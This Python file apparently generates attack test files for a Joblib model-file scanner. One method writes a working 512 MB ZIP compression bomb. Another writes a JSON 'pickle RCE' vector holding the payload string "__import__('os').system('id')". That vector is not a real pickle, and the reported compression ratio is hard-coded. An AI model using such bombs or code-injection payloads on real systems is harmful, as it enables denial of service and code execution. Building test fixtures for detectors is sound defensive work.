"""
Joblib Attack Vector Generator

Generates attack vectors for Joblib files (.joblib)
"""

import json
import zipfile
from pathlib import Path
from typing import List, Dict, Tuple


class JoblibAttackGenerator:
    """Generate Joblib-specific attack vectors."""
    
    def __init__(self, output_dir: str = "./output"):
        """Initialize the Joblib attack generator."""
        self.output_dir = Path(output_dir) / "joblib_vectors"
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.generated_files = []
    
    def generate_compression_bomb(self) -> Tuple[str, int]:
        """Generate Joblib with compression bomb.
        
        Attack Vector:
            Joblib file with:
            1. Extreme compression ratio (>1000x)
            2. Nested compression layers
            3. Resource exhaustion on decompress
            4. Memory allocation bomb
        
        Impact: Denial of service via memory/CPU exhaustion
        Severity: HIGH
        Detection: Compression ratio analysis
        
        Returns:
            Tuple of (filepath, compression_ratio)
        """
        filepath = self.output_dir / "01_compression_bomb.joblib"
        
        # Create a ZIP with highly compressible data
        with zipfile.ZipFile(filepath, 'w', zipfile.ZIP_DEFLATED) as zf:
            payload = "A" * (512 * 1024 * 1024)  # 512MB of As
            zf.writestr("data.pkl", payload, compress_type=zipfile.ZIP_DEFLATED)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 1000  # High compression ratio
    
    def generate_embedded_pickle_rce(self) -> Tuple[str, int]:
        """Generate Joblib with malicious pickle payload.
        
        Attack Vector:
            Joblib decompresses to pickle with:
            1. RCE opcodes
            2. Arbitrary code execution
            3. Module import side effects
            4. All pickle vulnerabilities
        
        Impact: Code execution via pickle
        Severity: CRITICAL
        Detection: Pickle opcode analysis
        
        Returns:
            Tuple of (filepath, num_pickle_ops)
        """
        filepath = self.output_dir / "02_embedded_pickle_rce.json"
        
        pickle_rce = {
            "joblib_format": "compressed_pickle",
            "compression": "zlib",
            "data": {
                "payload": "__import__('os').system('id')",
                "opcodes": ["REDUCE", "INST", "OBJ"]
            }
        }
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(pickle_rce, f, indent=2)
        
        self.generated_files.append(str(filepath))
        return str(filepath), 3
    
    def generate_all(self) -> Dict[str, Tuple[str, int]]:
        """Generate all Joblib attack vectors."""
        results = {
            "compression_bomb": self.generate_compression_bomb(),
            "pickle_rce": self.generate_embedded_pickle_rce(),
        }
        return results
    
    def get_generated_files(self) -> List[str]:
        """Get list of all generated files."""
        return self.generated_files


if __name__ == "__main__":
    generator = JoblibAttackGenerator(output_dir="./output")
    results = generator.generate_all()
    for name, (path, metric) in results.items():
        print(f"{name}: {path} ({metric})")
